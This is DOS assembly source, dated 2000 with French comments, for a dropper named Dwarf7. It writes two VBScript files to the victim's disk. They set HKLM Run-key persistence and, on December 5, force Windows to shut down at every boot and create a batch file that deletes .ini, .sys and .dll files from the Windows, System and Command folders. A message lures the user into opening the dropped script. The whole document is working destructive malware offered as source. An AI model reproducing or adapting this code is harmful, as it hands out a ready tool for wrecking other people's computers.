;Par M.Etienne KRAEMER (c)2000                          12/09/00
;TAILLE : 1282 OCTETS
;DWARF7 CREE DEUX PROGRAMME : Dwarf.vbs et Panda.vbs. DWARF.VBS VA
;RAJOUTER UNE CLE POUR ACTIVER PANDA.VBS TOUS LES JOURS. PANDA.VBS
;ENTRE EN ACTION QUE LE 5 DECEMBRE. IL RAJOUTE UNE CLE POUR ETEINDRE
;L'ORDINATEUR AU DEMARRAGE ET CREE UN FICHIER AUTOEXE.BAT QUI
;SUPPRIMERA DES FICHIER SUR L'ORDINATEUR.

.model small
.code
org 100h

FILE1:          mov ah,3Ch
                xor cx,cx
                mov dx,offset NOM1
                int 21h                 ;cr‚ation du 1er fichier
                xchg ax,bx
                mov ah,40h
                mov cx,progl1
                mov dx,offset prog1
                int 21h                 ;‚criture
                mov ah,3Eh
                int 21h                 ;fermeture
FILE2:          mov ah,3Ch
                xor cx,cx
                mov dx,offset NOM2
                int 21h                 ;cr‚ation du 2nd fichier
                xchg ax,bx
                mov ah,40h
                mov cx,progl2
                mov dx,offset prog2
                int 21h                 ;‚criture
                mov ah,3Eh
                int 21h                 ;fermeture
MESSAGE:        mov ax,3
                int 10h
                mov ah,9
                lea dx,msg
                int 21h
FIN:            mov ah,4Ch
                int 21h

NOM1    db 'c:\Dwarf.vbs',0
NOM2    db 'c:\WINDOWS\Panda.vbs',0
prog1   db 'rem DwArF.vbs by Panda (c)2000',0Dh,0Ah
        db 'msgbox "BONNO JOURNEE ?",vbexclamation',0Dh,0Ah
        db 'Dim W',0Dh,0Ah
        db 'Set W = Wscript.CreateObject("WScript.Shell")',0Dh,0Ah
        db 'W.Regwrite "HKLM\Software\Microsoft\Windows'
        db '\CurrentVersion\Run\DwArF", "C:\WINDOWS\Panda.vbs"'
progl1  equ $-prog1
prog2   db 'If Day(Now) = 5 And Month(Now) = 12 Then',0Dh,0Ah
        db 'msgbox "ERREUR : CLIQUEZ SUR OK",vbcritical',0DH,0Ah
        db 'Dim W',0DH,0Ah
        db 'Set W=CreateObject("WScript.Shell")',0DH,0Ah
        db 'W.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\'
        db 'Run\DwArF", "C:\WINDOWS\RUNDLL32.EXE '
        db '%windir%\system\user.exe,Exitwindows"',0DH,0Ah
        db 'W.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\'
        db 'Run\DwArF2", "C:\autoexe.bat"',0DH,0Ah
        db 'Set X=CreateObject("Scripting.FileSystemObject")',0DH,0Ah
        db 'file="C:\autoexe.bat"',0DH,0Ah
        db 'Set O=X.CreateTextFile(file, True, False)',0DH,0Ah
        db 'O.Writeline "@echo off"',0DH,0Ah
        db 'O.Writeline "del C:\WINDOWS\*.ini"',0DH,0Ah
        db 'O.Writeline "del C:\WINDOWS\*.sys"',0DH,0Ah
        db 'O.Writeline "del C:\WINDOWS\*.bmp"',0DH,0Ah
        db 'O.Writeline "del C:\WINDOWS\*.sys"',0DH,0Ah
        db 'O.Writeline "del C:\WINDOWS\E*.*"',0DH,0Ah
        db 'O.Writeline "del C:\WINDOWS\M*.*"',0DH,0Ah
        db 'O.Writeline "del C:\WINDOWS\COMMAND\*.*"',0DH,0Ah
        db 'O.Writeline "del C:\WINDOWS\SYSTEM\*.dll"',0DH,0Ah
        db 'O.Writeline "del C:\WINDOWS\SYSTEM\*.ini"',0DH,0Ah
        db 'msgbox "TU VAS MOURIR DEMAIN",vbinformation',0DH,0Ah
        db 'End If',0DH,0Ah
progl2  equ $-prog2
msg     db 7,7,7,10,13,'UN FICHIER A ETE CREE',0Ah,0Ah,0Dh
        db 'IL SE NOMME C:\Dwarf.vbs',10,10,13
        db 'OUVRE LE VITE $'

end FILE1
